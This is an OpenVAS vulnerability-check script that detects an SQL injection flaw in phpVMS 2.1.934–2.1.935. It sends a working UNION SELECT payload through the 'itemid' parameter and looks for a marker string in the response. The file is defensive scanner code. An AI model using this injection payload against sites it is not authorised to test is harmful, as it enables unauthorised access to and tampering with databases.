###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpvms_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# phpVMS Virtual Airline Administration SQL injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to disclose or
  manipulate SQL queries by injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "phpVMS version 2.1.934 & 2.1.935";


tag_insight = "Flaw is due to improper sanitation of user supplied input via the 'itemid'
  parameter to /index.php/PopUpNews/popupnewsitem/ script.";
tag_solution = "No solution or patch is available as of 17th, April 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.phpvms.net";
tag_summary = "This host is installed with phpVMS and is prone to sql injection
  vulnerability.";

if(description)
{
  script_id(803476);
  script_version("$Revision: 11 $");
  script_bugtraq_id(59057);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-17 10:51:22 +0530 (Wed, 17 Apr 2013)");
  script_name("phpVMS Virtual Airline Administration SQL injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.org/92328");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/53033");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24960");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/53033");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121306/phpvms-sql.txt");
  script_xref(name : "URL" , value : "http://evilc0de.blogspot.in/2013/04/phpvms-sql-injection-vulnerability.html");
  script_summary("Check if phpVMS is vulnerable to sql injection");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/php-vms", "/phpvms", cgi_dirs()))
{
  ## Request for the news.php
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## confirm the PHP-Fusion installation
  if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes) &&
                   (">phpVMS<" >< rcvRes))
  {
    ## Construct Attack Request
    url = dir + "/index.php/PopUpNews/popupnewsitem/?itemid=123+union+select+1"+
                ",0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4--";

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
          pattern:"OpenVAS-SQL-Injection-Test"))
    {
      security_hole(port);
      exit(0);
    }
  }
}
